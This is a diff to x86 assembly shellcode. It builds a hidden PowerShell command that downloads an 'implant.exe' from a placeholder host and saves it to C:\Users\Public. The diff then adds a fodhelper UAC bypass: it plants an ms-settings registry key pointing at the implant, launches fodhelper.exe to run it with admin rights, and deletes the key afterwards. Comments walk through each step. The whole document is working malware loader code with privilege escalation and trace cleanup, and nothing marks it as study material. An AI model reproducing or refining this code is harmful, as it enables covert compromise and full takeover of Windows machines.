@@ -96,7 +96,16 @@ _start:
     call .exec                 ; pushes &cmd, then jumps to .exec
 
 ; ── Command string ────────────────────────────────────────────────────────────
-;  Builds: powershell -w h -nop -c "<download and execute>"
+;  Builds: powershell -w h -nop -c "<download + fodhelper UAC bypass>"
+;
+;  Flow:
+;    1. Download implant to C:\Users\Public\i.exe
+;    2. Write HKCU ms-settings\shell\open\command → i.exe  (fodhelper registry key)
+;    3. Set DelegateExecute = "" (triggers auto-elevation lookup)
+;    4. Start fodhelper.exe  (whitelisted auto-elevate binary; reads key, runs i.exe as admin)
+;    5. Sleep 3s so fodhelper fires before registry cleanup
+;    6. Remove the registry key (cleanup)
+;
 ;  0x22 = "   0x27 = '   0x00 = null terminator
 ;  No null bytes within the string — only the final 0x00 terminates it.
 cmd:
@@ -105,7 +114,18 @@ cmd:
     db 0x27, 'http://HOST_IP:8000/implant.exe', 0x27
     db ','
     db 0x27, 'C:\Users\Public\i.exe', 0x27
-    db ');Start-Process '
+    db ');'
+    db 'New-Item -Force -Path '
+    db 0x27, 'HKCU:\Software\Classes\ms-settings\shell\open\command', 0x27
+    db ' -Value '
     db 0x27, 'C:\Users\Public\i.exe', 0x27
+    db ';'
+    db 'New-ItemProperty -Force -Path '
+    db 0x27, 'HKCU:\Software\Classes\ms-settings\shell\open\command', 0x27
+    db ' -Name DelegateExecute -Value '
+    db 0x27, 0x27                   ; empty string — required to trigger auto-elevation
+    db ';Start-Process fodhelper.exe;Start-Sleep 3;'
+    db 'Remove-Item -Force -Recurse '
+    db 0x27, 'HKCU:\Software\Classes\ms-settings', 0x27
     db 0x22
     db 0x00
